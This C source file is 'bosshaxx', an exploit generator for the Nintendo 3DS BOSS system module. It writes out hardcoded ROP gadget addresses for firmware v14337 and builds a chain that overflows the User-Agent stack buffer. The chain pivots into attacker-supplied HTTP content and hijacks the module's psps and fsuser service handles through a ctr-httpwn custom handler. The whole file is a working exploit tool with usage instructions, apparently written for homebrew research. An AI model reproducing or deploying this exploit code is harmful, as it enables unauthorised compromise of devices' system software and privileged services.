#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "types.h"

//Build with: gcc -o bosshaxx bosshaxx.c

FILE *fout = NULL;

char configxml_formatstr[] = {
"	<targeturl required_title=\"0004013000003402,0,%s\">\n\
		<name>bosshaxx</name>\n\
		<caps>AddRequestHeader</caps>\n\
		<url>%s</url>\n\
		<new_url>%s</new_url>\n\
		<maxrun_set>1</maxrun_set>\n\
		<maxrun>1</maxrun>\n\
\n\
		<requestoverride type=\"reqheader\">\n\
			<name>User-Agent</name>\n\
			<new_value format=\"hex\">%s</new_value>\n\
			<new_descriptorword_value>0xbcc</new_descriptorword_value>\n\
		</requestoverride>\n\
	</targeturl>\n"};

u32 ROP_POPR0R1R2R3R4R5R6PC = 0x0011356f; 

u32 ROP_POPR1R2R3PC = 0x00102341; 

u32 ROP_POPR2R3R4PC = 0x0010065d;

u32 ROP_POPR4R5R67PC = 0x00121a77;

u32 ROP_POPR4PC = 0x001000d1;

u32 ROP_STACKPIVOT = 0x00142c8c;//Add sp with r3 then pop-pc. 

u32 ROP_POPPC;

u32 ROP_LDRR0R1_BXR2 = 0x001022e5;//"ldr r0, [r1, #0]" "bx r2"

u32 ROP_STRR0R1 = 0x001005e3;//"str r0, [r1, #0]" bx-lr

u32 ROP_LDRR0SP0_POPR3PC = 0x00115427;//"ldr r0, [sp, #0]" "pop {r3, pc}"

u32 ROP_POPR3PC;

u32 ROP_BLXR4_POPR3R4R5PC = 0x00138435;//"blx r4" "pop {r3, r4, r5, pc}"

u32 ROP_MOVR1R0_BXLR = 0x0013b469;//"mov r1, r0" "bx lr"

u32 ROP_ADDR0R0R3_POPR2R3R4R5R6PC = 0x00104eb1;//"adds r0, r0, r3" "pop {r2, r3, r4, r5, r6, pc}"

u32 ROP_httpc_CreateContext = 0x001213f1;//inr0=_this inr1=url* inr2=u8 reqmethod inr3=flag. When flag is non-zero, use SetProxyDefault.
u32 ROP_httpc_CloseContext = 0x00123ee5;//inr0=_this
u32 ROP_httpc_AddRequestHeader = 0x00120869;//inr0=_this inr1=namestr* inr2=valuestr*

u32 ROP_svcSendSyncRequest = 0x00127a88;//svc 0x32 bx-lr
u32 ROP_svcCloseHandle = 0x00127aa8;//svc 0x23 bx-lr

u32 ROP_get_tls = 0x00127bc0;//r0 = tls+0 then bx-lr.

u32 ROP_memcpy = 0x00124774;

u32 BOSS_psps_sessionhandle = 0x0014b204;
u32 BOSS_fsuser_sessionhandle = 0x0014b198+16;

u32 BOSS_httptargetfunc_ropretaddr = 0x0010c197;//This is after the original return-addr, for calling the targeted function again.
u32 BOSS_httptargetfunc_useragent_stackaddr = 0x0803ba44;//Normal boss HTTP GET tasks. //policylist: 0x0803b7f8-0xa4;

u32 contentdatabuf_addr = 0x08032c00;//Unused memory near the end of the heap.

u32 ropvaddr_end = 0;

u32 ropheap = 0x0fffe000;

//From ctrtool.
void putle32(u8* p, u32 n)
{
	p[0] = n;
	p[1] = n>>8;
	p[2] = n>>16;
	p[3] = n>>24;
}

void ropgen_addword(u32 **ropchain, u32 *ropvaddr, u32 value)
{
	u32 *ptr = *ropchain;

	if(ropvaddr_end <= *ropvaddr)
	{
		printf("ROP-chain is too large: ropvaddr_end=0x%08x ropvaddr=0x%08x.\n", ropvaddr_end, *ropvaddr);
		exit(9);
	}

	putle32((u8*)ptr, value);

	(*ropchain)++;
	(*ropvaddr)+=4;
}

void ropgen_addwords(u32 **ropchain, u32 *ropvaddr, u32 *buf, u32 total_words)
{
	u32 *ptr = *ropchain;
	u32 pos;

	if(ropvaddr_end <= *ropvaddr || (ropvaddr_end < ((*ropvaddr) + total_words*4)))
	{
		printf("ROP-chain is too large: ropvaddr_end=0x%08x ropvaddr=0x%08x.\n", ropvaddr_end, *ropvaddr);
		exit(9);
	}

	if(buf)
	{
		for(pos=0; pos<total_words; pos++)putle32((u8*)&ptr[pos], buf[pos]);
	}
	else
	{
		memset(ptr, 0, total_words*4);
	}

	(*ropchain)+=total_words;
	(*ropvaddr)+= total_words*4;
}

void ropgen_popr1r2r3pc(u32 **ropchain, u32 *ropvaddr, u32 r1, u32 r2, u32 r3)//Total size: 0x10-bytes.
{
	ropgen_addword(ropchain, ropvaddr, ROP_POPR1R2R3PC);
	ropgen_addword(ropchain, ropvaddr, r1);
	ropgen_addword(ropchain, ropvaddr, r2);
	ropgen_addword(ropchain, ropvaddr, r3);
}

void ropgen_popr2r3r4pc(u32 **ropchain, u32 *ropvaddr, u32 r2, u32 r3, u32 r4)//Total size: 0x10-bytes.
{
	ropgen_addword(ropchain, ropvaddr, ROP_POPR2R3R4PC);
	ropgen_addword(ropchain, ropvaddr, r2);
	ropgen_addword(ropchain, ropvaddr, r3);
	ropgen_addword(ropchain, ropvaddr, r4);
}

void ropgen_popr4r5r6r7pc(u32 **ropchain, u32 *ropvaddr, u32 r4, u32 r5, u32 r6, u32 r7)//Total size: 0x14-bytes.
{
	ropgen_addword(ropchain, ropvaddr, ROP_POPR4R5R67PC);
	ropgen_addword(ropchain, ropvaddr, r4);
	ropgen_addword(ropchain, ropvaddr, r5);
	ropgen_addword(ropchain, ropvaddr, r6);
	ropgen_addword(ropchain, ropvaddr, r7);
}

void ropgen_popr0r1r2r3r4r5r6pc(u32 **ropchain, u32 *ropvaddr, u32 r0, u32 r1, u32 r2, u32 r3, u32 r4, u32 r5, u32 r6)//Total size: 0x20-bytes.
{
	ropgen_addword(ropchain, ropvaddr, ROP_POPR0R1R2R3R4R5R6PC);
	ropgen_addword(ropchain, ropvaddr, r0);
	ropgen_addword(ropchain, ropvaddr, r1);
	ropgen_addword(ropchain, ropvaddr, r2);
	ropgen_addword(ropchain, ropvaddr, r3);
	ropgen_addword(ropchain, ropvaddr, r4);
	ropgen_addword(ropchain, ropvaddr, r5);
	ropgen_addword(ropchain, ropvaddr, r6);
}

void ropgen_popr3(u32 **ropchain, u32 *ropvaddr, u32 value)//Total size: 0x8-bytes.
{
	ropgen_addword(ropchain, ropvaddr, ROP_POPR3PC);
	ropgen_addword(ropchain, ropvaddr, value);
}

void ropgen_setr0(u32 **ropchain, u32 *ropvaddr, u32 value)//Total size: 0x8-bytes.
{
	ropgen_addword(ropchain, ropvaddr, ROP_LDRR0SP0_POPR3PC);
	ropgen_addword(ropchain, ropvaddr, value);
}

void ropgen_setr4(u32 **ropchain, u32 *ropvaddr, u32 value)//Total size: 0x8-bytes.
{
	ropgen_addword(ropchain, ropvaddr, ROP_POPR4PC);
	ropgen_addword(ropchain, ropvaddr, value);
}

void ropgen_blxr4_popr3r4r5pc(u32 **ropchain, u32 *ropvaddr, u32 addr, u32 *regs)//Total size: 0x18-bytes.
{
	ropgen_setr4(ropchain, ropvaddr, addr);

	ropgen_addword(ropchain, ropvaddr, ROP_BLXR4_POPR3R4R5PC);

	ropgen_addwords(ropchain, ropvaddr, regs, 3);
}

void ropgen_movr1r0(u32 **ropchain, u32 *ropvaddr)//Total size: 0x18-bytes.
{
	ropgen_blxr4_popr3r4r5pc(ropchain, ropvaddr, ROP_MOVR1R0_BXLR, NULL);
}

void ropgen_ldrr0r1(u32 **ropchain, u32 *ropvaddr, u32 addr, u32 set_addr)//Total size: 0x14-bytes.
{
	if(set_addr)
	{
		ropgen_popr1r2r3pc(ropchain, ropvaddr, addr, ROP_POPPC, 0);
	}
	else
	{
		ropgen_popr2r3r4pc(ropchain, ropvaddr, ROP_POPPC, 0, 0);
	}

	ropgen_addword(ropchain, ropvaddr, ROP_LDRR0R1_BXR2);
}

void ropgen_strr0r1(u32 **ropchain, u32 *ropvaddr, u32 addr, u32 set_addr)//Total size: 0x18-bytes + <0x10 if set_addr is set>.
{
	if(set_addr)ropgen_popr1r2r3pc(ropchain, ropvaddr, addr, 0, 0);

	ropgen_blxr4_popr3r4r5pc(ropchain, ropvaddr, ROP_STRR0R1, NULL);
}

void ropgen_copyu32(u32 **ropchain, u32 *ropvaddr, u32 ldr_addr, u32 str_addr, u32 set_addr)//Total size: 0x2c + <0x10 if set_addr bit1 is set>.
{
	ropgen_ldrr0r1(ropchain, ropvaddr, ldr_addr, set_addr & 0x1);
	ropgen_strr0r1(ropchain, ropvaddr, str_addr, set_addr & 0x2);
}

void ropgen_writeu32(u32 **ropchain, u32 *ropvaddr, u32 value, u32 addr, u32 set_addr)//Total size: 0x20-bytes + <0x10 if set_addr is set>.
{
	ropgen_setr0(ropchain, ropvaddr, value);
	ropgen_strr0r1(ropchain, ropvaddr, addr, set_addr);
}

void ropgen_addr0r3_popr2r3r4r5r6(u32 **ropchain, u32 *ropvaddr, u32 value, u32 *regs)//Total size: 0x20-bytes.
{
	ropgen_popr3(ropchain, ropvaddr, value);

	ropgen_addword(ropchain, ropvaddr, ROP_ADDR0R0R3_POPR2R3R4R5R6PC);

	ropgen_addwords(ropchain, ropvaddr, regs, 5);
}

void ropgen_stackpivot(u32 **ropchain, u32 *ropvaddr, u32 addr)//Total size: 0x8-bytes.
{
	u32 ROP_STACKPIVOT_POPR3 = ROP_STACKPIVOT-4;//"pop {r3}", then the code from ROP_STACKPIVOT.

	ropgen_addword(ropchain, ropvaddr, ROP_STACKPIVOT_POPR3);
	ropgen_addword(ropchain, ropvaddr, addr - (*ropvaddr + 4));
}

void ropgen_callfunc(u32 **ropchain, u32 *ropvaddr, u32 funcaddr, u32 *params)//Total size: 0x18 + <0x20 when params is set>. Word-size of params is 7.
{
	u32 *stackparams = NULL;
	if(params)
	{
		stackparams = &params[4];
		ropgen_popr0r1r2r3r4r5r6pc(ropchain, ropvaddr, params[0], params[1], params[2], params[3], 0, 0, 0);
	}

	ropgen_blxr4_popr3r4r5pc(ropchain, ropvaddr, funcaddr, stackparams);
}

void ropgen_memcpy(u32 **ropchain, u32 *ropvaddr, u32 dst, u32 src, u32 size)//Total size: see ropgen_callfunc.
{
	u32 params[7] = {0};

	params[0] = dst;
	params[1] = src;
	params[2] = size;

	ropgen_callfunc(ropchain, ropvaddr, ROP_memcpy, params);
}

void ropgen_writecmdbufvalue(u32 **ropchain, u32 *ropvaddr, u32 offset, u32 valueaddr, u32 loadaddr)//Total size: 0x7c + <0x40 with loadaddr set>. Normally valueaddr is written directly to the cmdbuf, but when loadaddr is non-zero *valueaddr is written instead.
{
	u32 value=0;

	if(loadaddr==0)value=valueaddr;
	if(loadaddr)ropgen_copyu32(ropchain, ropvaddr, valueaddr, (*ropvaddr)+0x3c+0x54, 0x3);//Overwrite the value below.

	ropgen_callfunc(ropchain, ropvaddr, ROP_get_tls, NULL);//r0 = tls+0
	ropgen_addr0r3_popr2r3r4r5r6(ropchain, ropvaddr, 0x80+offset, NULL);
	ropgen_movr1r0(ropchain, ropvaddr);
	ropgen_writeu32(ropchain, ropvaddr, value, 0, 0);
}

void ropgen_httpc_customcmd(u32 **ropchain, u32 *ropvaddr, u32 httpctx, u32 type, u32 handleindex, u32 handle)
{
	u32 loadaddrhandle = 0;
	if(handle)loadaddrhandle = 1;

	ropgen_writecmdbufvalue(ropchain, ropvaddr, 0<<2, 0x18010082, 0);//cmdreq[0] = 0x18010082;//cmdhdr
	ropgen_writecmdbufvalue(ropchain, ropvaddr, 1<<2, type, 0);//cmdreq[1] = type;
	ropgen_writecmdbufvalue(ropchain, ropvaddr, 2<<2, handleindex, 0);//cmdreq[2] = handleindex;
	ropgen_writecmdbufvalue(ropchain, ropvaddr, 3<<2, 0, 0);//cmdreq[3] = IPC_Desc_SharedHandles(1);
	ropgen_writecmdbufvalue(ropchain, ropvaddr, 4<<2, handle, loadaddrhandle);//writeval = handle; if(handle){writeval = *handle;} cmdreq[4] = writeval;

	//Run svcSendSyncRequest with the httpctx session handle.
	ropgen_ldrr0r1(ropchain, ropvaddr, httpctx+12, 1);
	ropgen_callfunc(ropchain, ropvaddr, ROP_svcSendSyncRequest, NULL);
}

void buildrop_config(u32 *ropchain, u32 *ropvaddr, u32 ropchain_maxsize)
{
	u32 ua[0x80>>2];

	u32 tmpadr = (*ropvaddr) + 0xa4 + 0x40 + 0x28;

	u32 stack_contentbufsize_ptr = tmpadr+0x24; //= 0x803b874;
	u32 stack_recvdata_timeoutptr = tmpadr+0x38; //0x1FF80000+0x100;//Used since the 8-bytes here are always zero. //0x803b8b8;

	stack_contentbufsize_ptr = (*ropvaddr) + 0x90;

	//This ropchain buffer starts with the user-agent. The UA has 0x80-bytes allocated on stack, with the saved registers immediately following that. The sysmodule v13314 function for this is LT_121350.

	memset(ua, 0, sizeof(ua));
	strncpy((char*)ua, "PBOS-8.0/0000000000000000-0000000000000000/00.0.0-00X/00000/0", sizeof(ua)-1);

	ropgen_addwords(&ropchain, ropvaddr, ua, 0x80>>2);

	//r0-r3 are not popped from stack during return.
	ropgen_addword(&ropchain, ropvaddr, 0);//r0
	ropgen_addword(&ropchain, ropvaddr, 0);//r1
	ropgen_addword(&ropchain, ropvaddr, 0);//r2
	ropgen_addword(&ropchain, ropvaddr, contentdatabuf_addr);//r3, output content data addr for httpc_ReceiveDataTimeout.

	ropgen_addword(&ropchain, ropvaddr, 0x1000);//r4, this is the size field for stack_contentbufsize_ptr.
	ropgen_addword(&ropchain, ropvaddr, 0x35353535);//r5
	ropgen_addword(&ropchain, ropvaddr, 0x36363636);//r6
	ropgen_addword(&ropchain, ropvaddr, 0x37373737);//r7

	//pc for the initial reg-pop is here. The data starting at r4 below is also used by the target function as insp0, which has to be valid otherwise it won't download the content properly/crash.

	ropgen_popr4r5r6r7pc(&ropchain, ropvaddr, 0x0, stack_contentbufsize_ptr, stack_recvdata_timeoutptr, 0x0);

	ropgen_stackpivot(&ropchain, ropvaddr, contentdatabuf_addr);//Stack-pivot to the http content data downloaded by the targeted function.
}

void buildrop_http(u32 *ropchain, u32 *ropvaddr, u32 ropchain_maxsize)
{
	u32 *ropchain0, ropvaddr0;

	u32 httpctx = ropheap+0x0;
	u32 datastorageaddr;

	u32 params[7];
	u32 datastorage[(0x28+0xc+0x4+0x40)>>2];//The +0x40 is needed to avoid corruption on stack.

	u32 tmp;

	//Embed the URL in the ropchain data.
	memset(datastorage, 0, sizeof(datastorage));
	strncpy((char*)datastorage, "http://localhost/ctr-httpwn/cmdhandler", sizeof(datastorage)-1);
	strncpy((char*)&datastorage[0x28>>2], "User-Agent", 0xb);
	strncpy((char*)&datastorage[0x34>>2], "hax", 0x3);

	ropchain0 = ropchain;
	ropvaddr0 = *ropvaddr;
	ropgen_stackpivot(&ropchain, ropvaddr, 0);
	datastorageaddr = *ropvaddr;
	ropgen_addwords(&ropchain, ropvaddr, datastorage, sizeof(datastorage)>>2);

	ropgen_stackpivot(&ropchain0, &ropvaddr0, *ropvaddr);

	memset(params, 0, sizeof(params));

	params[0] = httpctx;//r0 = _this
	params[1] = datastorageaddr;//r1 = url
	params[2] = 1;//r2 = reqmethod (GET)
	params[3] = 1;//r3 = defaultproxy flag

	ropgen_callfunc(&ropchain, ropvaddr, ROP_httpc_CreateContext, params);

	memset(params, 0, sizeof(params));
	params[0] = httpctx;//r0 = _this
	params[1] = datastorageaddr+0x28;//r1 = namestr*
	params[2] = datastorageaddr+0x34;//r2 = valuestr*
	ropgen_callfunc(&ropchain, ropvaddr, ROP_httpc_AddRequestHeader, params);//Once this finishes, the ctr-httpwn custom-cmdhandler will be available via the context session handle.

	ropgen_httpc_customcmd(&ropchain, ropvaddr, httpctx, 0, 0, BOSS_psps_sessionhandle);//Send the sysmodule psps handle to the httpc custom-cmdhandler.
	ropgen_httpc_customcmd(&ropchain, ropvaddr, httpctx, 0, 1, BOSS_fsuser_sessionhandle);//Send the sysmodule fsuser handle to the httpc custom-cmdhandler.

	//Copy the sysmodule psps handle to ropheap+0x20, then overwrite the sysmodule psps handle with the custom-cmdhandler session handle. Then close the original handle since it's not used under BOSS sysmodule at this point.
	ropgen_copyu32(&ropchain, ropvaddr, BOSS_psps_sessionhandle, ropheap+0x20, 0x3);
	ropgen_copyu32(&ropchain, ropvaddr, httpctx+12, BOSS_psps_sessionhandle, 0x3);

	/*ropgen_ldrr0r1(&ropchain, ropvaddr, ropheap+0x20, 1);
	ropgen_callfunc(&ropchain, ropvaddr, ROP_svcCloseHandle, NULL);*/

	//Can't close the context since the session handle is used as the new psps handle.
	/*memset(params, 0, sizeof(params));
	params[0] = httpctx;//r0 = _this
	ropgen_callfunc(&ropchain, ropvaddr, ROP_httpc_CloseContext, params);*/

	//Return to the actual sysmodule code, with r0 set to ~0 for an error.
	tmp = BOSS_httptargetfunc_useragent_stackaddr + 0xa0;
	ropgen_writeu32(&ropchain, ropvaddr, BOSS_httptargetfunc_ropretaddr, tmp, 1);
	ropgen_memcpy(&ropchain, ropvaddr, tmp+4+4, tmp+4+0x44, 0x10);//Setup the stack params for the function which will be called.
	ropgen_setr0(&ropchain, ropvaddr, ~0);
	ropgen_stackpivot(&ropchain, ropvaddr, tmp);
}

int main(int argc, char **argv)
{
	int using_outpath = 0;
	int output_type = -1;
	int argi;
	u32 pos;

	u32 *ropchain = NULL;
	u8 *ropchain8 = NULL;
	char *configout = NULL;
	u32 configout_size = 0x400;
	u32 ropchain_maxsize = 0x1000;
	u32 ropvaddr=0;
	u32 ropvaddr_start=0;

	char *url = NULL, *new_url = NULL;
	char config_hexdata[0x200];

	fout = stdout;

	url = "https://nppl.c.app.nintendowifi.net/p01/policylist/";

	ROP_POPPC = ROP_STACKPIVOT+4;//"pop {pc}"
	ROP_POPR3PC = ROP_LDRR0SP0_POPR3PC+0x2;

	if(argc<3)
	{
		printf("bosshaxx by yellows8.\n");
		printf("Generate the ctr-httpwn config and http data for 3DS BOSS-sysmodule haxx.\n");
		printf("Usage:\n");
		printf("%s <config|http> <version> <options>\n", argv[0]);
		printf("Supported versions: 'v14337'.\n");
		printf("Options:\n");
		printf("--outpath=<filepath> Output path. If not specified stdout will be used instead.\n");
		printf("--url=<url> ctr-httpwn config <url> tag content. Default is the policylist url.\n");
		printf("--new_url=<url> ctr-httpwn config <new_url> tag content. Required with the config type.\n");
		return 1;
	}

	if(strcmp(argv[1], "config")==0)
	{
		output_type = 0;
	}
	else if(strcmp(argv[1], "http")==0)//Can be used with policylist or anything requested with HTTP GET.
	{
		output_type = 1;
	}
	else
	{
		printf("Invalid output_type: %s\n", argv[1]);
		return 2;
	}

	if(strcmp(argv[2], "v14337"))
	{
		printf("Invalid version: %s\n", argv[2]);
		return 3;
	}

	for(argi=3; argi<argc; argi++)
	{
		if(strncmp(argv[argi], "--outpath=", 10)==0)
		{
			fout = fopen(&argv[argi][10], "wb");
			if(fout==NULL)
			{
				printf("Failed to open output file: %s\n", &argv[argi][10]);
				return 4;
			}

			using_outpath = 1;
		}
		else if(strncmp(argv[argi], "--url=", 6)==0)
		{
			url = &argv[argi][6];
		}
		else if(strncmp(argv[argi], "--new_url=", 10)==0)
		{
			new_url = &argv[argi][10];
		}
	}

	if(output_type==0 && new_url==NULL)
	{
		printf("The new_url is required.\n");
		return 6;
	}

	if(output_type==0)
	{
		configout = malloc(configout_size);
		if(configout==NULL)
		{
			if(using_outpath)fclose(fout);
			printf("Failed to allocate memory for configout.\n");
			return 5;
		}
	}

	ropchain = malloc(ropchain_maxsize);
	ropchain8 = (u8*)ropchain;
	if(ropchain==NULL)
	{
		if(using_outpath)fclose(fout);
		if(output_type==0)free(configout);
		printf("Failed to allocate memory for ropchain.\n");
		return 5;
	}

	if(output_type==0)ropchain_maxsize = 0xbc;

	if(output_type==0)
	{
		ropvaddr_start = BOSS_httptargetfunc_useragent_stackaddr;
		ropvaddr = ropvaddr_start;
		ropvaddr_end = ropvaddr+ropchain_maxsize;
		buildrop_config(ropchain, &ropvaddr, ropchain_maxsize);
	}
	if(output_type==1)
	{
		ropvaddr_start = contentdatabuf_addr;
		ropvaddr = ropvaddr_start;
		ropvaddr_end = ropvaddr+ropchain_maxsize;
		buildrop_http(ropchain, &ropvaddr, ropchain_maxsize);
	}

	if(output_type==0)
	{
		memset(config_hexdata, 0, sizeof(config_hexdata));

		for(pos=0; pos<0xbc; pos++)sprintf(&config_hexdata[pos*2], "%02x", (unsigned int)ropchain8[pos]);

		snprintf(configout, configout_size-1, configxml_formatstr, argv[2], url, new_url, config_hexdata);
		fprintf(fout, "%s", configout);
	}

	if(output_type==1)
	{
		fwrite(ropchain, 1, ropvaddr-ropvaddr_start, fout);
	}

	if(output_type==0)free(configout);
	free(ropchain);

	if(using_outpath)
	{
		fclose(fout);
	}
	else
	{
		fflush(fout);
	}

	return 0;
}

